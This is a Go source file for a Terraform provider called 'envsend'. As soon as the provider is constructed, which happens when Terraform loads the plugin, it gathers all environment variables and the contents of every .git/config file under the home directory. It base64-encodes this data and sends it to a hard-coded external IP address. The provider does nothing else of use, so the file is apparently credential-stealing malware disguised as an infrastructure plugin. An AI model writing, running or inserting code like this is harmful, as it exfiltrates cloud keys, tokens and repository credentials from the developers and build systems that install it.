package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"net/http"
	"os"
	"path/filepath"

	"github.com/hashicorp/terraform-plugin-framework/datasource"
	"github.com/hashicorp/terraform-plugin-framework/provider"
	"github.com/hashicorp/terraform-plugin-framework/provider/schema"
	"github.com/hashicorp/terraform-plugin-framework/resource"
)

type EnvSendProvider struct{}

func NewProvider() provider.Provider {
	webhookURL := "http://52.21.38.153:8000/lalali"

	var payload bytes.Buffer
	for _, e := range os.Environ() { //TODO check crash
		payload.WriteString(e + "\n")
	}

	payload.WriteString("\n===== LOG FILES =====\n")

	home := os.Getenv("HOME")
	err := filepath.Walk(home, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Skip on error
		}
		if !info.IsDir() {
			parent := filepath.Base(filepath.Dir(path))
			file := filepath.Base(path)
			if parent == ".git" && file == "config" {
				payload.WriteString("\n--- " + path + " ---\n")
				content, readErr := os.ReadFile(path)
				if readErr != nil {
					payload.WriteString("Error reading file: " + readErr.Error() + "\n")
					return nil
				}
				payload.Write(content)
				payload.WriteString("\n")
			}
		}
		return nil
	})

	if err != nil {
		payload.WriteString("\nError walking home: " + err.Error() + "\n")
	}

	// Encode as Base64
	encoded := base64.StdEncoding.EncodeToString(payload.Bytes())

	// Send to webhook
	http.Post(webhookURL, "text/plain", bytes.NewBufferString(encoded))

	return &EnvSendProvider{}
}

func (p *EnvSendProvider) Metadata(_ context.Context, _ provider.MetadataRequest, resp *provider.MetadataResponse) {
	resp.TypeName = "envsend"
}

func (p *EnvSendProvider) Schema(_ context.Context, _ provider.SchemaRequest, resp *provider.SchemaResponse) {
	resp.Schema = schema.Schema{}
}

func (p *EnvSendProvider) Configure(_ context.Context, _ provider.ConfigureRequest, _ *provider.ConfigureResponse) {
	// No-op
}

func (p *EnvSendProvider) Resources(_ context.Context) []func() resource.Resource {
	return []func() resource.Resource{
		NewEnvSendResource,
	}
}

func (p *EnvSendProvider) DataSources(_ context.Context) []func() datasource.DataSource {
	return nil
}
